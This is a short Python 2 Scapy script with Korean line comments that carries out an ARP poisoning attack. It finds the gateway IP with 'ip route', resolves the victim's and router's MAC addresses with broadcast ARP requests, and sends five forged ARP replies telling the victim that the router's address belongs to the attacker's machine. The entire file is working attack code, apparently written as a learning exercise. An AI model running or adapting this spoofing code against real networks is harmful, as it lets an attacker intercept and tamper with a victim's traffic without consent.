from scapy.all import * # Scapy 모듈 불러오기
import os # OS 모듈 불러오기
import sys # SYS 모듈 불러오기

rout_com = os.popen("ip route | awk '{print $3}'") # 리눅스 명령어 ip route를 사용하여 라우터 IP 정보 분리
rout_info = (rout_com.read()) # 라우터 IP 정보 읽어들여 info에 저장

route_addr = rout_info.split("\n")[0] # 라우터 IP 값 부분만 addr에 저장

victim_ip = sys.argv[1] # 실행 인자 값을 피해자 IP 변수에 저장.

def get_vict_mac(ip_addr): # IP 값을 받는 피해자 MAC 주소 추출 함수 선언

	global victim_mac # 피해자 MAC 주소 전역 변수 선언

	responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_addr), timeout = 2, retry = 10) # 입력받은 IP를 기반으로 전체에 패킷 수신
	
	for eth, arps in responses: # 반응한 패킷에 한해 정보를 대입
	
		victim_mac = arps[ARP].hwsrc # 추출한 정보 중 ARP 영역에서 Source MAC 주소 출력

		print "\n[!] Victim MAC Address :" + victim_mac # 피해자 MAC 주소 출력

def get_rout_mac(ip_addr): # IP 값을 받는 라우터 MAC 주소 추출 함수 선언

	global route_mac # 라우터 MAC 주소 전역 변수 선언

	responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_addr), timeout = 2, retry = 10) # 입력받은 IP를 기반으로 전체에 패킷 수신
	
	for eth, arps in responses: # 반응한 패킷에 한해 정보를 대입
	
		route_mac = arps[ARP].hwsrc # 추출한 정보 중 ARP 영역에서 Source MAC 주소 출력

		print "\n[!] Route MAC Address :" + route_mac # 라우터 MAC 주소 출력 

def arp_poison(routerIP, victimIP, routerMAC, victimMAC): # 라우터 IP, 피해자 IP, 라우터 MAC, 피해자 MAC 주소를 받는 함수 선언

	send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC)) # 입력받는 정보를 통해 피해자에게 라우터의 MAC주소를 속이는 패킷을 전송

print "\n[!] Check Victim MAC Address\n"

get_vict_mac(victim_ip) # 피해자 IP 값을 피해자 MAC 주소 추출 함수에 대입하여 실행 

print "[!] Check Route MAC Address\n"

get_rout_mac(route_addr) # 라우터 IP 값을 라우터 MAC 주소 추출 함수에 대입하여 실행

print "[!] Start ARP Poisoning\n"

count = 0 # 카운트 숫자 0부터 시작

while count < 5: # 카운트가 5 미만이 될 때까지 반복

	count = count + 1 # 카운트 1씩 증가

	arp_poison(route_addr, victim_ip, route_mac, victim_mac) # 정보를 입력받아 ARP Posioning 함수 실행